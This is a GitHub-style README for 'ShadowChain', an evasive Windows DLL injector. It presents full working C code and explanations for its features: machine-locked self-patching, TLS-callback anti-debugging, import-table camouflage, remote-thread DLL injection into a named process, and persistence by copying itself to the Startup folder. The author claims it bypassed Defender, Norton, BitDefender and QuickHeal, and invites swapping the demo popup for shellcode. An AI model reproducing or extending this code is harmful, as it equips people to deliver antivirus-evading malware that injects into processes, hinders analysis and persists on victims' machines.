# ShadowChain
---------
Shadow Chain is a modular DRM enabled dll injector with capabilities of Anti-debugging and persistence.

Due to it's nature as a dll injector, the payload isn't stored in the main injector but rather in the dll. This reduces entropy of ShadowChain and lowers the risk of detection as an dll being detected as malicious is far better than the injector being deemed as malicious. For this implementation, my payload is a simple windows popup but this payload can be changed to anything; be it a shellcode or other payload formats. More advanced implementations can aslo be made such as obfuscating or encrypting the payload to further reduce the chances of detection. The payload is only limited to one's imagination.

**This implementation has already bypassed several anti-viruses such as Defender, Norton, BitDefender and QuickHeal.** I haven't had the chance to test it out on enterprise EDR solutions yet.

I have given detailed explanation of the code below but please feel free to contact me for further information.

# Features Of ShadowChain

1. Digital Rights Management(DRM) using volume serial number of the machine
2. Anti-debugging usig TLS Callbacks
3. IAT Camoflague
4. Remote process Dll Injection
5. Persistence using Startup Folder

# Explanation Of Working Of ShadowChain

## FlowChart Of ShadowChain

![image](https://github.com/user-attachments/assets/3a5eafdf-0f44-4d34-b753-203956ae40b1)

## Digital Rights Management (DRM)
-------
The `IsSameMachine()` function in the `ShadowChain.c` file is responsible for implementing a Digital Rights Management (DRM) mechanism. This function ensures that the program runs only on the machine it was originally installed on by checking and patching the executable with the machine's volume serial number. Here is a detailed explanation of how the `IsSameMachine()` function works:

### Function Overview
The `IsSameMachine()` function performs the following steps:
1. Retrieves the volume serial number of the C: drive.
2. Compares the retrieved serial number with a stored constant value.
3. If the serial number matches the stored value, it confirms that the program is running on the same machine.
4. If the serial number does not match, it checks if the stored value is an initial placeholder value.
5. If the stored value is the initial placeholder, it patches the executable with the current serial number.
6. If the stored value is not the initial placeholder, it indicates that the program is running on a different machine.

### Flowchart Of DRM
![image](https://github.com/user-attachments/assets/6c24eb1a-78d6-43f1-8722-87f59f3b7841)

### Detailed Steps

1. **Retrieve Volume Serial Number**:
   ```C
   DWORD dwSerialNumber = 0x00;
   if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
    printf("[!] GetVolumeInformationW Failed With Error: %d \n", GetLastError());
    return FALSE;
   }
   ```
    - The function uses `GetVolumeInformationW` to retrieve the volume serial number of the C: drive.
    - If the function fails or the serial number is zero, it prints an error message and returns `FALSE`.

2. **Compare Serial Number with Stored Value**:
   ```C
   printf("[i] New Volume Serial Number: 0x%0.4X\n", dwSerialNumber);
   printf("[i] Old Volume Serial Number: 0x%0.4X\n", g_dwSerialNumberConstVariable);

   if (g_dwSerialNumberConstVariable == dwSerialNumber) {
    printf("[*] Same Machine \n");
    return TRUE;
   }
   ```
    - The function prints the retrieved serial number and the stored constant value (`g_dwSerialNumberConstVariable`).
    - If the retrieved serial number matches the stored value, it confirms that the program is running on the same machine and returns `TRUE`.

![image](https://github.com/user-attachments/assets/9f10fa16-e954-4000-a71d-8c9b066463d6)


3. **Check for Initial Placeholder Value**:
    ```C
    if (g_dwSerialNumberConstVariable != INITIAL_VALUE) {
    printf("[!] Different Machine \n");
    return FALSE;
   }
   ```
   - If the stored value does not match the retrieved serial number, the function checks if the stored value is the initial placeholder (`INITIAL_VALUE`).
   - If the stored value is not the initial placeholder, it indicates that the program is running on a different machine and returns `FALSE`.

4. **Patch Executable with Current Serial Number**:
    ```C
    printf("[i] First Time Running, Patching Image ... \n");

   szLocalImage = (LPWSTR)(((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer);
   if (!ReadSelfFromDiskW(szLocalImage, &uModule, &dwFileSize))
       goto _FUNC_CLEANUP;

   pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
   if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
       goto _FUNC_CLEANUP;

   pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
   for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {
       if (*(ULONG*)pImgSec[i].Name == 'adr.') {
           for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)) {
               if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
                   uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
           }
       }
   }

   if (uMachineSerialVA != 0x00) {
       *(DWORD*)uMachineSerialVA = dwSerialNumber;

       if (!DeleteSelfFromDiskW(szLocalImage))
           goto _FUNC_CLEANUP;

       if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
           goto _FUNC_CLEANUP;

       bResult = TRUE;
   }
   ```
    - If the stored value is the initial placeholder, the function proceeds to patch the executable with the current serial number.
    - It retrieves the path of the current executable and reads its contents into memory using `ReadSelfFromDiskW`.
    - It locates the NT headers and the `.rdata` section where the serial number is stored.
    - It searches for the initial placeholder value in the `.rdata` section and replaces it with the current serial number.
    - It deletes the old executable from disk using `DeleteSelfFromDiskW` and writes the patched executable back to disk using `WriteSelfToDiskW`.
    - If the patching is successful, it sets the result to `TRUE`.

5. **Cleanup and Return**:
   ```C
   _FUNC_CLEANUP:
   if (uModule != NULL)
       HeapFree(GetProcessHeap(), 0x00, uModule);
   return bResult;
     ```
- The function performs cleanup by freeing the allocated memory and returns the result.    

6. `ReadSelfFromDiskW` Function
The `ReadSelfFromDiskW` function reads the executable image of the current process from disk. Here is a detailed explanation of how the function works:

```C
// Function to read self image from disk
BOOL ReadSelfFromDiskW(IN LPWSTR szLocalImageName, OUT ULONG_PTR* pModule, OUT DWORD* pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	PBYTE		pFileBuffer = NULL;
	DWORD		dwFileSize = 0x00,
		dwNumberOfBytesRead = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pModule || !pdwFileSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Get the file size
	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Allocate memory for the file
	if ((pFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Read the file
	if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Return the file buffer and the file size
	*pModule = (ULONG_PTR)pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*pModule && pFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pFileBuffer);
	return *pModule == NULL ? FALSE : TRUE;
}

```

It takes three parameters.
- `szLocalImageName`: The path to the executable image.
- `pModule`: A pointer to store the address of the read image.
- `pdwFileSize`: A pointer to store the size of the read image.

After accepting the required parameters, it -
- Initializes variables for the file handle, file buffer, file size, and number of bytes read.
- Checks if the input parameters are valid. If not, returns `FALSE`.
- Opens the file for reading. If it fails, prints an error message and jumps to the cleanup section.
- Retrieves the file size. If it fails, prints an error message and jumps to the cleanup section.
- Allocates memory to store the file contents. If it fails, prints an error message and jumps to the cleanup section.
- Reads the file into the allocated buffer. If it fails, prints an error message and jumps to the cleanup section.
- Stores the file buffer address and size in the output parameters.
- Closes the file handle and frees the allocated memory if necessary. Returns `TRUE` if successful, `FALSE` otherwise.

7. `WriteSelfToDiskW` Function
The `WriteSelfToDiskW` function writes the executable image to disk. Here is a detailed explanation of how the function works:

```C
// Function to write self image to disk
BOOL WriteSelfToDiskW(IN LPWSTR szLocalImageName, IN PVOID pImageBase, IN DWORD sImageSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pImageBase || !sImageSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Write the file
	if (!WriteFile(hFile, pImageBase, sImageSize, &dwNumberOfBytesWritten, NULL) || sImageSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwNumberOfBytesWritten == sImageSize ? TRUE : FALSE;
}

```

It takes three parameters.
- `szLocalImageName`: The path to the executable image.
- `pImageBase`: The address of the image to be written.
- `sImageSize`: The size of the image to be written.

After accepting the required parameters, it -
- Initializes variables for the file handle and number of bytes written.
- Checks if the input parameters are valid. If not, returns `FALSE`.
- Opens the file for writing. If it fails, prints an error message and jumps to the cleanup section.
- Writes the image to the file. If it fails, prints an error message and jumps to the cleanup section.
- Closes the file handle and returns `TRUE` if the write was successful, `FALSE` otherwise.

8. `DeleteSelfFromDiskW` Function
The `DeleteSelfFromDiskW` function deletes the executable image from disk by renaming it and then setting it for deletion.

```C
// Structure for File Deletion
typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[1]" (See FILE_RENAME_INFO's original documentation)
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;

// Function to delete file image from disk
BOOL DeleteSelfFromDiskW(IN LPCWSTR szFileName) {

	BOOL						bResult = FALSE;
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO       DisposalInfo = { .DeleteFile = TRUE };
	FILE_RENAME_INFO2			RenameInfo = { .FileNameLength = sizeof(L":%x%x\x00"), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };

	// Check if the parameters are valid
	if (!szFileName)
		return FALSE;

	// Generate a random name
	swprintf(RenameInfo.FileName, MAX_PATH, L":%x%x\x00", rand(), rand() * rand());

	// Open the file
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Rename the file
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Close the handle
	CloseHandle(hFile);

	// Open the file again
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Delete the file
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Set the result to TRUE
	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}

```

It only takes one parameter.
- `szFileName`: The path to the executable image to be deleted.

Then it - 
- Initializes variables for the result, file handle, file disposition info, and file rename info.
- Checks if the input parameter is valid. If not, returns `FALSE`.
- Generates a random name for the file.
- Opens the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Renames the file. If it fails, prints an error message and jumps to the cleanup section.
- Closes the file handle and reopens the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Sets the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Sets the result to `TRUE` if the file was successfully deleted.
- Closes the file handle and returns the result.

## Anti-Debugging Using TLS Callbacks
---------
TLS callbacks are a set of callback functions specified within the TLS directory of a PE file, these callbacks are executed by the Windows loader before thread creation, meaning that a TLS callback can be executed before the main thread. From an anti-analysis perspective, TLS callbacks can be used to check if the implementation is being analyzed before executing the main function.

The `ReadSelfFromDiskW` function reads the executable image of the current process from disk. Here is a detailed explanation of how the function works:

### Preprocessor code

```C
#pragma once
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")

//----------------------------------------------------------------------------------------------------------------

#define OVERWRITE_SIZE				0x500
#define INT3_INSTRUCTION_OPCODE		0xCC

//----------------------------------------------------------------------------------------------------------------
#define ERROR_BUF_SIZE				(MAX_PATH * 2)
//----------------------------------------------------------------------------------------------------------------
#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  

//----------------------------------------------------------------------------------------------------------------

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}

//----------------------------------------------------------------------------------------------------------------
// TLS Callback Function Prototypes:

VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
```
##### Linker Directives
- This directive instructs the linker to include the symbol `_tls_used` in the output file. This is necessary to ensure that the TLS (Thread Local Storage) callbacks are properly registered and executed.
`#pragma comment (linker, "/INCLUDE:_tls_used")`
- This directive instructs the linker to include the symbol `CheckIfImgOpenedInADebugger` in the output file. This is necessary to ensure that the TLS callback function `ADTlsCallback` is properly registered and executed.
`#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")`


##### Constants And Macros
- Defines the size (in bytes) to be overwritten in the `main` function if an `INT 3` instruction is detected. The value `0x500` (1280 bytes) is used as the overwrite size.
`#define OVERWRITE_SIZE 0x500`
- Defines the opcode for the `INT 3` instruction, which is commonly used by debuggers to set breakpoints. The value `0xCC` is the opcode for the `INT 3` instruction.
`#define INT3_INSTRUCTION_OPCODE 0xCC`
- Defines the size of the error buffer used in the `PRINT` macro. The value is set to twice the maximum path length (`MAX_PATH`), which is typically 260 characters.
`#define ERROR_BUF_SIZE (MAX_PATH * 2)`
- Defines a macro for printing formatted strings to the console. The macro allocates a buffer, formats the string, writes it to the console, and then frees the buffer.
```C
#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    } 
```

##### Custom memset Function
- Declares an external `memset` function with the `__cdecl` calling convention.
- Instructs the compiler to use the intrinsic version of the `memset` function, if available.
- Instructs the compiler to use the user-defined version of the `memset` function, overriding the intrinsic version.
- Implements a custom `memset` function that fills a block of memory with a specified value.
```C
extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}
```

##### TLS Callback Function Prototypes
- Declares the prototype for the TLS callback function `ADTlsCallback`.
- Instructs the compiler to place the following constant data in the `.CRT$XLB` section.
- Defines a constant pointer to the `ADTlsCallback` function and places it in the `.CRT$XLB` section. This ensures that the TLS callback function is registered and executed when the process is attached.
- Resets the section to the default.
```C
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
```

### TLS Function Code

```C
// Anti-debugging TLS Callback Function
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

	DWORD		dwOldProtection = 0x00;

	// Get the address of the main function
	if (dwReason == DLL_PROCESS_ATTACH) {
		PRINT("[TLS][i] Main Function Address: 0x%p \n", main);

		// Check if the entry point is patched with INT 3 instruction
		if (*(BYTE*)main == INT3_INSTRUCTION_OPCODE) {
			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");

			// Overwrite main function - process crash
			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
				memset(main, 0xFF, OVERWRITE_SIZE);
				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
			}

			// Restore the original protection
			else {
				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
			}

		}
	}
}
```
The `ADTlsCallBack` function requires three parameters -

- `hModule`: A handle to the module.
- `dwReason`: The reason for the callback. This can be one of several values, such as `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, or `DLL_PROCESS_DETACH`.
- `pContext`: Reserved for future use and is typically `NULL`.

After accepting the parameters, the function - 

- Initializes a variable to store the old protection attributes of the memory region.
```C
DWORD dwOldProtection = 0x00;
```
- Checks if the reason for the callback is `DLL_PROCESS_ATTACH`, which indicates that the process is being attached.
```C
if (dwReason == DLL_PROCESS_ATTACH) {
```
- Uses the `PRINT` macro to print the address of the `main` function.
```C
PRINT("[TLS][i] Main Function Address: 0x%p \n", main);
```
- Checks if the first byte of the `main` function is the `INT 3` instruction opcode (`0xCC`), which is commonly used by debuggers to set breakpoints.
- If the entry point is patched with the `INT 3` instruction, it prints a warning message.
```C
if ((BYTE)main == INT3_INSTRUCTION_OPCODE) {
	PRINT("[TLS][!] Entry Point Is Patched With "INT 3" Instruction!\n");
}
```
- Attempts to change the protection of the memory region containing the `main` function to `PAGE_EXECUTE_READWRITE` using `VirtualProtect`.
- If successful, it overwrites the `main` function with `0xFF` bytes using the custom `memset` function.
- Prints a message indicating that the `main` function has been overwritten.
```C
if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	memset(main, 0xFF, OVERWRITE_SIZE);
	PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
}
```
- If the `VirtualProtect` call fails, it prints a message indicating that it failed to overwrite the entry point.
```C
else {
	PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
}
```

## IAT Camoflague
------
The `IATCamoflage2` function is designed to add whitelisted APIs to camouflage the Import Address Table (IAT). This function allocates memory, performs some checks, and then calls various registry-related functions to obfuscate the IAT. This is essential to obfuscate "Offensive APIs" by importing a bunch of useless whitelisted APIs.

### Detailed Steps

1. **Allocate Memory**:
- Allocates 256 bytes (`0x100`) of zero-initialized memory from the process heap.
- If the allocation fails, the function returns immediately.
```C
ULONG_PTR uAddress = NULL;
if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100))) {
	return;
}
```

2. **Perform a Check on the Allocated Address**:
- Shifts the allocated address right by 8 bits and masks it with `0xFF`.
- If the result is greater than `0xFFFF`, it calls various registry-related functions with `NULL` parameters. This is done to obfuscate the IAT by adding these function calls to the import table.
```C
if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
	RegCloseKey(NULL);
	RegDeleteKeyExA(NULL, NULL, NULL, NULL);
	RegDeleteKeyExW(NULL, NULL, NULL, NULL);
	RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegisterServiceCtrlHandlerA(NULL, NULL);
	RegisterServiceCtrlHandlerW(NULL, NULL);
}
```

3. **Free the Allocated Memory**:
- Frees the allocated memory.
- If the memory cannot be freed, the function returns immediately.
```C
if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
	return;
}
```

## Remote process Dll Injection
-------
The remote process Dll Injection takes place through two different functions. -

### `GetRemoteProcessHandle` Function

The `GetRemoteProcessHandle` function enumerates processes and gets the handle of a specified remote process. Here is a detailed explanation of how the function works:

#### Parameters
- `szProcessName`: The name of the process to find.
- `dwProcessID`: A pointer to store the process ID of the found process.
- `hProcess`: A pointer to store the handle of the found process.

#### Detailed Steps

1. **Initialize the Process Entry Structure**:
   - Initializes a `PROCESSENTRY32` structure to store information about the processes.

`PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };`

2. **Initialize Variables**:
- Initializes a variable for the snapshot handle.

`HANDLE hSnapShot = NULL;`

3. **Get the Snapshot of the Processes**:
- Creates a snapshot of the processes using `CreateToolhelp32Snapshot`.
- If the snapshot creation fails, prints an error message and jumps to the cleanup section.

```C
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}
```

4. **Read the First Process**:
- Retrieves information about the first process in the snapshot using `Process32First`.
- If the retrieval fails, prints an error message and jumps to the cleanup section.

```C
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}
```

5. **Read the Remaining Processes**:
- Iterates through the remaining processes in the snapshot using `Process32Next`.
- If the process name matches the specified process name, retrieves the process ID and opens a handle to the process using `OpenProcess`.
- If the handle opening fails, prints an error message.

```C
	//Read The Remaining Processes
	do {
		// If the process name matches the required process name
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Get the process ID
			*dwProcessID = Proc.th32ProcessID;
			//Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
			if (*hProcess == NULL) {
				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
			}
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));
```


6. **Cleanup and Return**:
- Closes the snapshot handle and returns `TRUE` if the process was found and the handle was successfully opened, `FALSE` otherwise.

```C
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessID == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
```

### `InjectDllToRemoteProcess` Function

The `InjectDllToRemoteProcess` function injects a DLL into a remote process. Here is a detailed explanation of how the function works:

#### Parameters
- `hProcess`: The handle of the remote process.
- `DllName`: The name of the DLL to be injected.

#### Detailed Steps

1. **Initialize Variables**:
- Initializes variables for the state, the address of `LoadLibraryW`, and the address in the remote process.
```C
	BOOL		bSTATE = TRUE;
	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;
```

2. **Fetch the Size of the DLL Name**:
- Calculates the size of the DLL name in bytes.
```C
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;
```

3. **Load `LoadLibraryW` Function**:
- Retrieves the handle of `kernel32.dll` using `GetModuleHandle`.
- If the handle retrieval fails, prints an error message and jumps to the cleanup section.
- Retrieves the address of `LoadLibraryW` using `GetProcAddress`.
- If the address retrieval fails, prints an error message and jumps to the cleanup section.
```C
	//Opening a handle to kernel32.dll
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

	// Get the address of LoadLibraryW and loading it
    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }
```

4. **Allocate Memory in the Remote Process**:
- Allocates memory in the remote process using `VirtualAllocEx`.
- If the memory allocation fails, prints an error message and jumps to the cleanup section.
```C
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
```

5. **Write the DLL Name to the Allocated Memory**:
- Writes the DLL name to the allocated memory in the remote process using `WriteProcessMemory`.
- If the memory writing fails, prints an error message and jumps to the cleanup section.
```C
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
```

6. **Create a Remote Thread to Load the DLL**:
- Creates a remote thread in the remote process to load the DLL using `CreateRemoteThread`.
- If the thread creation fails, prints an error message and jumps to the cleanup section.
```C
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
```

7. **Cleanup and Return**:
- Closes the thread handle and returns the state (`TRUE` if successful, `FALSE` otherwise).
```C
_EndOfFunction:
	if (hThread) {
		CloseHandle(hThread);
	}
	return bSTATE;
```

## Persistence Using Startup Folder
--------

The `MoveToStartup` function moves the current running binary to the startup folder to ensure it runs on system startup. Here is a detailed explanation of how the function works:


### Detailed Steps

1. **Initialize Variables**:
- Initializes variables to store the paths of the startup folder, the current binary location, and the new path in the startup folder.
```C
    wchar_t szStartupPath[MAX_PATH];
    wchar_t szCurrentPath[MAX_PATH];
    wchar_t szNewPath[MAX_PATH];
```

2. **Get the Path of the Startup Folder**:
- Retrieves the path of the startup folder using `SHGetFolderPath`.
- If the retrieval fails, prints an error message and returns `FALSE`.
```C
    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
        printf("[!] SHGetFolderPath Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }
```

3. **Get the Current Location of the Binary**:
- Retrieves the current location of the binary using `GetModuleFileName`.
- If the retrieval fails, prints an error message and returns `FALSE`.
```C
    DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
    if (length == 0) {
        printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }
```

4. **Construct the New Path in the Startup Folder**:
- Finds the last backslash in the current path to separate the directory from the executable name.
- Constructs the new path in the startup folder by appending the executable name to the startup folder path using `StringCchPrintf`.
- If the construction fails, prints an error message and returns `FALSE`.
```C
    wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
    if (lastSlash != NULL) {
        StringCchPrintf(szNewPath, MAX_PATH, L"%s%s", szStartupPath, lastSlash);
    } else {
        printf("[!] Failed to construct new path\n");
        return FALSE;
    }
```

5. **Copy the Binary to the Startup Folder**:
- Copies the binary to the startup folder using `CopyFile`.
- If the copy operation fails, prints an error message and returns `FALSE`.
```C
    if (!CopyFile(szCurrentPath, szNewPath, FALSE)) {
        printf("[!] CopyFile Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }
```

6. **Print Success Message and Return**
- Prints a success message indicating that the binary was successfully moved to the startup folder.
- Returns `TRUE`.
```C
    printf("[+] Successfully moved the binary to the startup folder\n");
    return TRUE;
```


